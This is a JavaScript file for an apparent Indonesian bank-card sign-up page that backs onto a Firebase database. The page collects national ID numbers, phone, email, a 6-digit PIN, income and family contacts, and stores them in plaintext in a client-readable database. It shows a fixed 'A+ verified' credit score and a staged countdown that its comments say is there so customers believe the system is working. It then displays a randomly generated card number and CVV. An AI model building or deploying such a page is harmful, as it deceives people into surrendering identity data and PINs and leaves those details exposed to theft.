import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;
let isFlipLocked = false;
let finalDataReady = null; // Menyimpan hasil generate kartu selama loading

const inputNama = document.getElementById('inputNama');
const inputNIK = document.getElementById('inputNIK');
const inputWA = document.getElementById('inputWA');
const inputPW = document.getElementById('inputPW');

// Filter input nama (Hanya huruf di UI, tapi validasi simbol dilakukan di Step 9)
inputNama.addEventListener('input', (e) => {
    e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, "");
});

[inputNIK, inputWA, inputPW].forEach(el => {
    el.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, "");
    });
});

window.nextStep = (s) => {
    if (s > currentStep && !validateFields(currentStep)) return;
    currentStep = s;
    updateUI(s);
    if (s === 6) prosesAnalisisSistem();
};

window.prevStep = () => {
    if (currentStep > 1) {
        currentStep--;
        updateUI(currentStep);
        document.getElementById('btnSlik').style.display = "none";
        document.getElementById('errorActions').style.display = "none";
    }
};

function validateFields(step) {
    if (step === 1) {
        if (inputNama.value.trim().length < 3) { alert("Nama lengkap minimal 3 huruf!"); return false; }
        if (inputNIK.value.length !== 16) { alert("NIK harus 16 digit angka!"); return false; }
    }
    if (step === 2) {
        if (inputWA.value.length < 11 || inputWA.value.length > 13) { alert("WhatsApp harus 11-13 digit!"); return false; }
        if (!document.getElementById('inputEmail').value.includes('@')) { alert("Email tidak valid!"); return false; }
    }
    if (step === 5 && inputPW.value.length !== 6) {
        alert("PIN harus 6 digit!"); return false;
    }
    if (step === 7 && !document.getElementById('checkAgree').checked) {
        alert("Harap centang persetujuan!"); return false;
    }
    if (step === 8 && document.getElementById('countrySelect').value === "") {
        alert("Pilih negara domisili!"); return false;
    }
    return true;
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
    const percent = ((s - 1) / 8) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    document.querySelectorAll('.circle').forEach((c, i) => {
        c.classList.remove('active', 'completed');
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.innerHTML = i + 1; }
    });
}

// Validasi simbol tersembunyi
function hasForbiddenSymbols(str) {
    const forbidden = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?0-9]/; 
    return forbidden.test(str);
}

async function prosesAnalisisSistem() {
    const status = document.getElementById('slikStatus');
    const btnNext = document.getElementById('btnSlik');
    const errAct = document.getElementById('errorActions');
    status.innerHTML = "Mengecek integritas data...";
    
    // Pengecekan NIK dasar di tahap 6
    try {
        const snapshot = await get(child(ref(db), 'nasabah'));
        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) {
                if (data[id].nik === inputNIK.value) {
                    status.innerHTML = `<b style="color:red">SKOR E: DITOLAK</b><br>NIK sudah terdaftar.`;
                    errAct.style.display = "block";
                    return;
                }
            }
        }
    } catch (e) { console.error("Database Connection Error"); }

    setTimeout(() => {
        status.innerHTML = `<b style="color:#22c55e">SKOR A+: TERVERIFIKASI</b>`;
        btnNext.style.display = "flex";
    }, 2500);
}

window.generateFinal = async () => {
    updateUI(9);
    startSecureValidation();
};

async function startSecureValidation() {
    let timeLeft = 120;
    const timerDisplay = document.getElementById('timerDisplay');
    
    // --- PROSES VALIDASI DALAM LOADING ---
    try {
        timerDisplay.innerText = "Memulai sinkronisasi data...";

        // 1. Cek Nama (Simbol/Angka yang lolos)
        if (hasForbiddenSymbols(inputNama.value)) {
            throw new Error("Nama mengandung karakter ilegal.");
        }

        // 2. Tarik data database untuk cek duplikasi final
        const snapshot = await get(child(ref(db), 'nasabah'));
        const dbData = snapshot.exists() ? snapshot.val() : {};
        const entries = Object.values(dbData);

        // 3. Cek NIK lagi (Double Check)
        if (entries.some(user => user.nik === inputNIK.value)) {
            throw new Error("NIK sudah digunakan nasabah lain.");
        }

        // 4. Generate Nomor Kartu Unik (Cek agar 4 digit belakang tidak sama)
        const prefix = "0810";
        let isUnique = false;
        let generatedNo = "";

        while (!isUnique) {
            const mid = Math.floor(10000000 + Math.random() * 90000000).toString();
            const last = Math.floor(1000 + Math.random() * 9000).toString();
            generatedNo = prefix + mid + last;
            
            // Cek duplikasi nomor kartu
            if (!dbData[generatedNo]) { isUnique = true; }
        }

        // Simpan hasil ke variabel global untuk diambil saat timer habis
        finalDataReady = {
            cardNo: generatedNo,
            cvv: Math.floor(Math.random() * 899 + 100)
        };

    } catch (err) {
        alert("Sistem menolak permintaan pembuatan kartu karna alasan tertentu: " + err.message);
        window.location.reload(); // Kembali ke awal
        return;
    }

    // --- JALANKAN TIMER VISUAL ---
    const countdown = setInterval(() => {
        timeLeft--;
        
        // Update teks agar nasabah merasa sistem sedang bekerja keras
        if (timeLeft > 90) timerDisplay.innerText = `Menghubungkan ke Server Pusat... (${timeLeft}s)`;
        else if (timeLeft > 60) timerDisplay.innerText = `Memverifikasi NIK & Data Diri... (${timeLeft}s)`;
        else if (timeLeft > 30) timerDisplay.innerText = `Menyusun Kunci Enkripsi Kartu... (${timeLeft}s)`;
        else timerDisplay.innerText = `Finalisasi Pencetakan Digital... (${timeLeft}s)`;

        if (timeLeft <= 0) {
            clearInterval(countdown);
            finalRevealProcess();
        }
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';
    document.querySelector('.card-scene').classList.add('final-glow');

    const { cardNo, cvv } = finalDataReady;
    const cardFormatted = cardNo.match(/.{1,4}/g).join(" ");
    const selectedCountry = document.getElementById('countrySelect').value;
    
    // Tampilkan ke kartu
    document.getElementById('displayNo').innerText = cardFormatted;
    document.getElementById('displayName').innerText = inputNama.value;
    document.querySelector('.cvv-code').innerText = cvv;

    const nasabahData = {
        activeVariant: "Platinum",
        cardStatus: "Active",
        country: selectedCountry,
        email: document.getElementById('inputEmail').value.trim(),
        kontak_darurat: {
            nama_keluarga: document.querySelector('.em-name')?.value || "-",
            nomor_hp: document.querySelector('.em-phone')?.value || "-"
        },
        nama: inputNama.value.trim(),
        nik: inputNIK.value,
        nomor_kartu: cardNo, 
        pekerjaan: document.getElementById('jobType').value,
        pendapatan: document.getElementById('income').value,
        pin: inputPW.value,
        saldo: selectedCountry === 'ID' ? 100000 : 10, 
        tgl_daftar: new Date().toISOString(),
        wa: inputWA.value
    };

    try {
        await set(ref(db, 'nasabah/' + cardNo), nasabahData);
        sessionStorage.setItem('userCard', cardNo);
        sessionStorage.setItem('isAuth', 'true');
    } catch (e) { 
        alert("Koneksi terputus saat menyimpan data!");
        window.location.reload();
    }

    // Munculkan checklist detail satu per satu
    for(let i=1; i<=3; i++) {
        await new Promise(r => setTimeout(r, 600));
        document.getElementById(`rev${i}`).classList.add('show');
    }
}

window.toggleFlip = () => {
    if (isFlipLocked) { alert("Tunggu 5 detik..."); return; }
    const card = document.getElementById('cardInner');
    card.classList.toggle('is-flipped');
    isFlipLocked = true;
    const flipBtn = document.getElementById('btnFlip');
    let countdown = 5;
    const timer = setInterval(() => {
        countdown--;
        flipBtn.innerText = `🔄 (${countdown}s)`;
        if (countdown <= 0) {
            clearInterval(timer);
            isFlipLocked = false;
            flipBtn.innerText = "🔄 PUTAR KARTU";
        }
    }, 1000);
};

window.takeScreenshot = () => {
    const area = document.getElementById('captureArea');
    const btn = document.getElementById('btnDownload');
    btn.innerText = "MENGUNDUH...";
    html2canvas(area, { 
        scale: 3, 
        useCORS: true, 
        backgroundColor: null,
        logging: false 
    }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${inputNama.value}.png`;
        link.href = canvas.toDataURL("image/png");
        link.click();
        btn.innerText = "📸 SIMPAN GAMBAR KARTU";
    });
};

window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    const newItem = document.createElement('div');
    newItem.className = 'emergency-item';
    newItem.innerHTML = `
        <div class="input-group"><label>Nama Keluarga</label><input type="text" class="em-name"></div>
        <div class="input-group"><label>Nomor HP</label><input type="tel" class="em-phone"></div>
    `;
    container.appendChild(newItem);
};
